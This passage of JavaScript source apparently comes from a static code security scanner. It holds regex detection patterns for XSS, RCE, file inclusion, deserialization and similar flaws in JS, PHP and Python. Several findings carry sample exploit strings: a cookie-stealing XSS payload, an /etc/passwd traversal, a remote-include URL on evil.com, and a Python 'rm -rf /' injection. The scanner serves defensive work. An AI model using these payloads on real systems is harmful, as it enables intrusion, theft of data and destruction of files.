      const matches = this.findMatches(code, rule.pattern, false);
      matches.forEach((match) => {
        const location = this.getExactLocation(code, match);
        const lineData = lines.find((l) => l.number === location.line);

        if (lineData) {
          issues.push({
            id: crypto.randomUUID(),
            ruleId: `xss-${rule.type.toLowerCase().replace(/\s+/g, "-")}`,
            message: `${rule.type} vulnerability detected`,
            line: location.line,
            column: location.column,
            severity: rule.severity,
            category: "SECURITY",
            suggestion: "Sanitize user input with DOMPurify or use textContent",
            problematicCode: lineData.text.trim(),
            context: this.getContext(lines, location.line),
            exploitScenario: "<img src=x onerror=alert(document.cookie)>",
          });
        }
      });
    });

    return issues;
  }

  detectPrototypePollution(code, lines) {
    const issues = [];
    const patterns = [
      /\.__proto__\s*=/,
      /\[\s*['"]__proto__['"]\s*\]\s*=/,
      /\.constructor\.prototype\s*=/,
      /Object\.assign\s*\(\s*\w+\.__proto__/,
      /lodash\.merge.*\$_(GET|POST|REQUEST)/,
      /\.extend\s*\(\s*true.*\$_(GET|POST)/,
    ];

    patterns.forEach((pattern) => {
      const matches = this.findMatches(code, pattern, false);
      matches.forEach((match) => {
        const location = this.getExactLocation(code, match);
        const lineData = lines.find((l) => l.number === location.line);

        if (lineData) {
          issues.push({
            id: crypto.randomUUID(),
            ruleId: "prototype-pollution",
            message: "Prototype pollution vulnerability",
            line: location.line,
            column: location.column,
            severity: "HIGH",
            category: "SECURITY",
            suggestion: "Use Object.freeze() or Object.create(null)",
            problematicCode: lineData.text.trim(),
            context: this.getContext(lines, location.line),
            exploitScenario:
              "Attacker can modify Object.prototype affecting entire application",
          });
        }
      });
    });

    return issues;
  }

  detectDependencyConfusion(code, lines) {
    const issues = [];
    const patterns = [
      /npm\s+install\s+[^@\s]+@/,
      /yarn\s+add\s+[^@\s]+@/,
      /pip\s+install\s+[^=\s]+==/,
      /composer\s+require\s+[^@\s]+@/,
    ];

    patterns.forEach((pattern) => {
      const matches = this.findMatches(code, pattern, false);
      matches.forEach((match) => {
        const location = this.getExactLocation(code, match);
        const lineData = lines.find((l) => l.number === location.line);

        if (lineData) {
          issues.push({
            id: crypto.randomUUID(),
            ruleId: "dependency-confusion",
            message: "Potential dependency confusion risk",
            line: location.line,
            column: location.column,
            severity: "MEDIUM",
            category: "SECURITY",
            suggestion:
              "Pin exact versions, use private registry, verify package names",
            problematicCode: lineData.text.trim(),
            context: this.getContext(lines, location.line),
          });
        }
      });
    });

    return issues;
  }

  detectPHPRCE(code, lines) {
    const issues = [];
    const patterns = [
      { pattern: /\beval\s*\(/, name: "eval()", severity: "CRITICAL" },
      { pattern: /\bassert\s*\(/, name: "assert()", severity: "CRITICAL" },
      {
        pattern: /\b(system|exec|shell_exec|passthru|popen|proc_open)\s*\(/,
        name: "shell execution",
        severity: "CRITICAL",
      },
      {
        pattern: /\`[^`]+\`/,
        name: "backtick execution",
        severity: "CRITICAL",
      },
      {
        pattern: /preg_replace\s*\([^)]*['"]\/e['"`]/,
        name: "preg_replace /e",
        severity: "CRITICAL",
      },
      {
        pattern: /create_function\s*\(/,
        name: "create_function()",
        severity: "CRITICAL",
      },
      {
        pattern: /mb_ereg_replace\s*\([^)]*['"]e['"`]/,
        name: "mb_ereg_replace /e",
        severity: "CRITICAL",
      },
    ];

    patterns.forEach((rule) => {
      const matches = this.findMatches(code, rule.pattern, false);
      matches.forEach((match) => {
        const location = this.getExactLocation(code, match);
        const lineData = lines.find((l) => l.number === location.line);

        if (lineData) {
          issues.push({
            id: crypto.randomUUID(),
            ruleId: "rce",
            message: `Remote code execution via ${rule.name}`,
            line: location.line,
            column: location.column,
            severity: rule.severity,
            category: "SECURITY",
            suggestion: "Avoid dynamic code execution, use safe alternatives",
            problematicCode: lineData.text.trim(),
            context: this.getContext(lines, location.line),
            exploitScenario: "Attacker can execute arbitrary system commands",
          });
        }
      });
    });

    return issues;
  }

  detectPHPFileInclusion(code, lines) {
    const issues = [];
    const patterns = [
      {
        pattern:
          /\b(include|require)(_once)?\s*\(?\s*\$_(GET|POST|REQUEST|COOKIE|SERVER)/,
        name: "LFI/RFI",
        severity: "CRITICAL",
      },
      {
        pattern: /\b(include|require)(_once)?\s*\(?\s*\$\w+/,
        name: "dynamic inclusion",
        severity: "HIGH",
      },
      {
        pattern: /readfile\s*\(\s*\$_(GET|POST|REQUEST)/,
        name: "readfile LFI",
        severity: "HIGH",
      },
      {
        pattern: /file_get_contents\s*\(\s*\$_(GET|POST|REQUEST)/,
        name: "file_get_contents LFI",
        severity: "HIGH",
      },
    ];

    patterns.forEach((rule) => {
      const matches = this.findMatches(code, rule.pattern, false);
      matches.forEach((match) => {
        const location = this.getExactLocation(code, match);
        const lineData = lines.find((l) => l.number === location.line);

        if (lineData) {
          issues.push({
            id: crypto.randomUUID(),
            ruleId: "file-inclusion",
            message: `File inclusion vulnerability: ${rule.name}`,
            line: location.line,
            column: location.column,
            severity: rule.severity,
            category: "SECURITY",
            suggestion: "Use hardcoded paths or strict whitelist validation",
            problematicCode: lineData.text.trim(),
            context: this.getContext(lines, location.line),
            exploitScenario:
              "?file=../../../etc/passwd or ?file=http://evil.com/shell",
          });
        }
      });
    });

    return issues;
  }

  detectPHPSerialization(code, lines) {
    const issues = [];
    const patterns = [
      {
        pattern: /\bunserialize\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)/,
        name: "object injection",
        severity: "CRITICAL",
      },
      { pattern: /\bunserialize\s*\(/, name: "unserialize", severity: "HIGH" },
      {
        pattern: /\bphar:\/\//,
        name: "phar stream wrapper",
        severity: "CRITICAL",
      },
    ];

    patterns.forEach((rule) => {
      const matches = this.findMatches(code, rule.pattern, false);
      matches.forEach((match) => {
        const location = this.getExactLocation(code, match);
        const lineData = lines.find((l) => l.number === location.line);

        if (lineData) {
          issues.push({
            id: crypto.randomUUID(),
            ruleId: "serialization",
            message: `PHP object injection via ${rule.name}`,
            line: location.line,
            column: location.column,
            severity: rule.severity,
            category: "SECURITY",
            suggestion:
              "Use json_encode/json_decode or validate serialized data",
            problematicCode: lineData.text.trim(),
            context: this.getContext(lines, location.line),
            exploitScenario: "Crafted serialized object leads to RCE",
          });
        }
      });
    });

    return issues;
  }

  detectPythonRCE(code, lines) {
    const issues = [];
    const patterns = [
      {
        pattern: /\b(eval|exec|compile)\s*\(\s*input\s*\(/,
        name: "eval/exec with input",
        severity: "CRITICAL",
      },
      {
        pattern: /\b(eval|exec|compile)\s*\(\s*request\./,
        name: "eval/exec with request",
        severity: "CRITICAL",
      },
      { pattern: /\beval\s*\(/, name: "eval()", severity: "CRITICAL" },
      { pattern: /\bexec\s*\(/, name: "exec()", severity: "CRITICAL" },
      { pattern: /os\.system\s*\(/, name: "os.system", severity: "CRITICAL" },
      {
        pattern: /subprocess\.call\s*\([^)]*shell\s*=\s*True/,
        name: "subprocess with shell",
        severity: "CRITICAL",
      },
      {
        pattern: /subprocess\.Popen\s*\([^)]*shell\s*=\s*True/,
        name: "Popen with shell",
        severity: "CRITICAL",
      },
    ];

    patterns.forEach((rule) => {
      const matches = this.findMatches(code, rule.pattern, false);
      matches.forEach((match) => {
        const location = this.getExactLocation(code, match);
        const lineData = lines.find((l) => l.number === location.line);

        if (lineData) {
          issues.push({
            id: crypto.randomUUID(),
            ruleId: "rce",
            message: `Remote code execution: ${rule.name}`,
            line: location.line,
            column: location.column,
            severity: rule.severity,
            category: "SECURITY",
            suggestion:
              "Use safer alternatives like ast.literal_eval or subprocess with shell=False",
            problematicCode: lineData.text.trim(),
            context: this.getContext(lines, location.line),
            exploitScenario: "__import__('os').system('rm -rf /')",
          });
        }
      });
    });

    return issues;
  }

  detectPythonDeserialization(code, lines) {
    const issues = [];
    const patterns = [
      { pattern: /pickle\.loads?\s*\(/, name: "pickle", severity: "CRITICAL" },
      {
        pattern: /yaml\.load\s*\([^)]*\)(?!.*safe)/,
        name: "yaml.load unsafe",
        severity: "CRITICAL",
      },
      {
        pattern: /yaml\.load\s*\([^)]*Loader\s*=\s*(?!yaml\.SafeLoader)/,
        name: "yaml.load unsafe Loader",
        severity: "CRITICAL",
      },
      { pattern: /marshal\.loads?\s*\(/, name: "marshal", severity: "HIGH" },
      { pattern: /shelve\.open\s*\(/, name: "shelve", severity: "HIGH" },
    ];

    patterns.forEach((rule) => {
      const matches = this.findMatches(code, rule.pattern, false);
      matches.forEach((match) => {
        const location = this.getExactLocation(code, match);
        const lineData = lines.find((l) => l.number === location.line);

        if (lineData) {
          issues.push({
            id: crypto.randomUUID(),
            ruleId: "deserialization",
            message: `Insecure deserialization: ${rule.name}`,
            line: location.line,
            column: location.column,
            severity: rule.severity,
            category: "SECURITY",
            suggestion:
              "Use json for serialization or validate data with safe methods",
            problematicCode: lineData.text.trim(),
            context: this.getContext(lines, location.line),
            exploitScenario: "Crafted payload executes arbitrary code",
          });
        }
      });
    });

    return issues;
  }

  detectPythonPathTraversal(code, lines) {
    const issues = [];
    const patterns = [
      {
        pattern: /open\s*\([^)]*\+\s*(request|sys\.argv)/,
        name: "open with user input",
        severity: "HIGH",
      },
      {
        pattern: /open\s*\([^)]*%(?!.*safe)/,
        name: "open with format string",
        severity: "HIGH",
      },
      {
        pattern: /\.read\s*\(\s*\)\s*if\s*['"\.\.]\./,
        name: "path traversal check bypass",
        severity: "MEDIUM",
      },
    ];

    patterns.forEach((rule) => {
      const matches = this.findMatches(code, rule.pattern, false);
      matches.forEach((match) => {
        const location = this.getExactLocation(code, match);
        const lineData = lines.find((l) => l.number === location.line);

        if (lineData) {
          issues.push({
            id: crypto.randomUUID(),
            ruleId: "path-traversal",
            message: `Path traversal: ${rule.name}`,
            line: location.line,
            column: location.column,
            severity: rule.severity,
            category: "SECURITY",
            suggestion:
              "Use os.path.abspath and validate against base directory",
            problematicCode: lineData.text.trim(),
            context: this.getContext(lines, location.line),
            exploitScenario: "../../../etc/passwd",
          });
        }
      });
    });

    return issues;
  }

  detectReactVulnerabilities(code, lines) {
    const issues = [];
    const patterns = [
      {
        pattern: /dangerouslySetInnerHTML\s*=\s*\{\{\s*__html:/,
        name: "React XSS",
        severity: "CRITICAL",
      },
      {
        pattern: /href\s*=\s*\{.*req\.|href\*=\s*\{.*props\./,
        name: "Open redirect",
        severity: "MEDIUM",
      },
      {
        pattern: /target\s*=\s*['"]_blank['"]\s*(?!.*rel).*href/,
        name: "Missing rel=noopener",
        severity: "LOW",
      },
    ];

    patterns.forEach((rule) => {
      const matches = this.findMatches(code, rule.pattern, false);
      matches.forEach((match) => {
        const location = this.getExactLocation(code, match);
        const lineData = lines.find((l) => l.number === location.line);

        if (lineData) {
          issues.push({
            id: crypto.randomUUID(),
            ruleId: `react-${rule.name.toLowerCase().replace(/\s+/g, "-")}`,
            message: `React vulnerability: ${rule.name}`,
            line: location.line,
            column: location.column,
            severity: rule.severity,
            category: "SECURITY",
            suggestion:
              rule.name === "React XSS"
                ? "Sanitize HTML with DOMPurify"
                : rule.name === "Open redirect"
                  ? "Whitelist allowed URLs"
                  : 'Add rel="noopener noreferrer"',
            problematicCode: lineData.text.trim(),
            context: this.getContext(lines, location.line),
          });
        }
      });
    });

    return issues;
  }

  detectLaravelVulnerabilities(code, lines) {
    const issues = [];
    const patterns = [
      {
        pattern: /User::create\s*\(\s*\$request->all\s*\(\s*\)/,
        name: "Mass assignment",
        severity: "HIGH",
      },
      {
        pattern: /->save\s*\(\s*\$request->all\s*\(\s*\)/,
        name: "Mass assignment",
        severity: "HIGH",
      },
      {
        pattern: /DB::raw\s*\(\s*\$/,
        name: "Raw SQL with variable",
        severity: "CRITICAL",
      },
      {
        pattern: /->whereRaw\s*\([^)]*\$/,
        name: "whereRaw with variable",
        severity: "CRITICAL",
      },
    ];

    patterns.forEach((rule) => {
      const matches = this.findMatches(code, rule.pattern, false);
      matches.forEach((match) => {
        const location = this.getExactLocation(code, match);
        const lineData = lines.find((l) => l.number === location.line);

        if (lineData) {
          issues.push({
            id: crypto.randomUUID(),
            ruleId: `laravel-${rule.name.toLowerCase().replace(/\s+/g, "-")}`,
            message: `Laravel vulnerability: ${rule.name}`,
            line: location.line,
            column: location.column,
            severity: rule.severity,
            category: "SECURITY",
            suggestion:
              rule.name === "Mass assignment"
                ? "Use $fillable or $guarded"
                : "Use parameterized queries",
            problematicCode: lineData.text.trim(),
            context: this.getContext(lines, location.line),
          });
        }
      });
    });

    return issues;
  }

  detectDjangoVulnerabilities(code, lines) {
    const issues = [];
    const patterns = [
      {
        pattern: /\.raw\s*\([^)]*%/,
        name: "Raw SQL formatting",
        severity: "CRITICAL",
      },
      {
        pattern: /cursor\.execute\s*\([^)]*%/,
        name: "Cursor SQL formatting",
        severity: "CRITICAL",
      },
      {
        pattern: /extra\s*\([^)]*select.*%/,
        name: "extra() SQL injection",
        severity: "CRITICAL",
      },
      {
        pattern: /mark_safe\s*\(\s*request\./,
        name: "XSS via mark_safe",
        severity: "CRITICAL",
      },
    ];

    patterns.forEach((rule) => {
      const matches = this.findMatches(code, rule.pattern, false);
      matches.forEach((match) => {
        const location = this.getExactLocation(code, match);
        const lineData = lines.find((l) => l.number === location.line);

        if (lineData) {
          issues.push({
            id: crypto.randomUUID(),
            ruleId: `django-${rule.name.toLowerCase().replace(/\s+/g, "-")}`,
            message: `Django vulnerability: ${rule.name}`,
            line: location.line,
            column: location.column,
            severity: rule.severity,
            category: "SECURITY",
            suggestion: "Use parameterized queries or ORM methods",
            problematicCode: lineData.text.trim(),
            context: this.getContext(lines, location.line),
          });
        }
      });
    });

    return issues;
  }

  detectFramework(code, lang) {
    if (lang === "javascript") {
      if (/\bimport\s+React\b|\bfrom\s+['"]react['"]/.test(code))
        return "react";
      if (/\bimport\s+.*\bfrom\s+['"]vue['"]/.test(code)) return "vue";
      if (/\bimport\s+.*\bfrom\s+['"]@angular\//.test(code)) return "angular";
      if (/\bexpress\s*\(|\brequire\s*\(\s*['"]express['"]/.test(code))
        return "express";
    }
    if (lang === "php") {
      if (/\buse\s+Illuminate\\|\\bnamespace\s+App\\/.test(code))
        return "laravel";
      if (/\buse\s+Symfony\\/.test(code)) return "symfony";
    }
    if (lang === "python") {
      if (/\bfrom\s+django\.|\bimport\s+django\b/.test(code)) return "django";
      if (/\bfrom\s+flask\s+import\s+Flask/.test(code)) return "flask";
      if (/\bfrom\s+fastapi\s+import\s+FastAPI/.test(code)) return "fastapi";
    }
    return null;
  }

  detectFunctionBoundaries(lines, lang) {
    const functions = [];
    const patterns = {
      javascript:
        /^\s*(async\s+)?function\s+(\w+)|^\s*const\s+(\w+)\s*=\s*(async\s*)?\(|^\s*(\w+)\s*:\s*(async\s*)?\(|^\s*class\s+(\w+)/,
      php: /^\s*(public|private|protected|static)?\s*function\s+(\w+)|^\s*class\s+(\w+)/,
      python: /^\s*def\s+(\w+)|^\s*class\s+(\w+)/,
    };

    const pattern = patterns[lang] || patterns.javascript;
    let currentFunction = null;
    let braceCount = 0;

    lines.forEach((line, idx) => {
      const match = line.text.match(pattern);
      if (match) {
        if (currentFunction) {
          currentFunction.length = idx - currentFunction.startLine + 1;
          functions.push(currentFunction);
        }
        currentFunction = {
          name: match.slice(1).find((m) => m) || "anonymous",
          startLine: line.number,
          length: 0,
          signature: line.text.trim(),
        };
        braceCount = 0;
      }

      if (currentFunction) {
        braceCount += (line.text.match(/\{|\(/g) || []).length;
        braceCount -= (line.text.match(/\}|\)/g) || []).length;

        if (braceCount === 0 && !line.text.match(pattern)) {
          currentFunction.length = line.number - currentFunction.startLine + 1;
          functions.push(currentFunction);
          currentFunction = null;
        }
      }
    });

    if (currentFunction) {
      currentFunction.length = lines.length - currentFunction.startLine + 1;
      functions.push(currentFunction);
    }

    return functions;
  }

  findMatches(code, pattern, multiline = false) {
    const matches = [];
    const flags = multiline ? "gs" : "g";
    const regex = new RegExp(pattern.source || pattern, flags);

    let match;
    while ((match = regex.exec(code)) !== null) {
      matches.push(match);
    }

    return matches;
  }

  getExactLocation(code, match) {
    const index = match.index;
    const linesBefore = code.substring(0, index).split("\n");
    const line = linesBefore.length;
    const column = linesBefore[linesBefore.length - 1].length + 1;

    return { line, column };
  }

  getContext(lines, lineNumber, contextSize = 2) {
    const start = Math.max(0, lineNumber - contextSize - 1);
    const end = Math.min(lines.length, lineNumber + contextSize);

    return lines.slice(start, end).map((l) => ({
      line: l.number,
      text: l.text,
      isError: l.number === lineNumber,
    }));
  }

  isCommentLine(text) {
    const trimmed = text.trim();
    return (
      trimmed.startsWith("//") ||
      trimmed.startsWith("/*") ||
      trimmed.startsWith("*") ||
      trimmed.startsWith("#") ||
      trimmed.startsWith("'")
    );
  }

  extractVariables(code, lang) {
    const patterns = {
      javascript: /\b([a-zA-Z_$][a-zA-Z0-9_$]*)\s*=/g,
      php: /\$([a-zA-Z_][a-zA-Z0-9_]*)/g,
      python: /\b([a-zA-Z_][a-zA-Z0-9_]*)\s*=/g,
    };

    const pattern = patterns[lang] || patterns.javascript;
    const variables = [];
    let match;

    while ((match = pattern.exec(code)) !== null) {
      if (!variables.includes(match[1])) {
        variables.push(match[1]);
      }
    }

    return variables.slice(0, 5);
  }

  maskSecret(text) {
    return text.replace(/['"`]([A-Za-z0-9_\-]{20,})['"`]/g, '"***MASKED***"');
  }

  deduplicateIssues(issues) {
    const seen = new Set();
    return issues.filter((issue) => {
      const key = `${issue.ruleId}-${issue.line}-${issue.message}`;
      if (seen.has(key)) return false;
      seen.add(key);
      return true;
    });
  }

  calculateScore(issues) {
    const weights = {
      CRITICAL: 8,
      HIGH: 5,
      MEDIUM: 2,
      LOW: 0.5,
      INFO: 0,
    };

    const totalDeduction = issues.reduce((acc, issue) => {
      return acc + (weights[issue.severity] || 0.5);
    }, 0);

    return Math.max(0, Math.min(100, Math.round(100 - totalDeduction)));
  }

  generateSummary(issues, score) {
    if (score === 100) {
      return "Perfect! No security issues detected.";
    }

    const critical = issues.filter((i) => i.severity === "CRITICAL").length;
    const high = issues.filter((i) => i.severity === "HIGH").length;
    const medium = issues.filter((i) => i.severity === "MEDIUM").length;

    let summary = `Found ${issues.length} issues: `;
    if (critical > 0) summary += `${critical} critical, `;
    if (high > 0) summary += `${high} high, `;
    if (medium > 0) summary += `${medium} medium, `;
    summary = summary.replace(/, $/, "");

    if (critical > 0) {
      summary += ". Immediate attention required for critical vulnerabilities.";
    } else if (high > 0) {
      summary += ". Address high severity issues soon.";
    } else {
      summary += ". Mostly style and minor issues.";
    }

    return summary;
  }
}

export const analyzerService = new AnalyzerService();
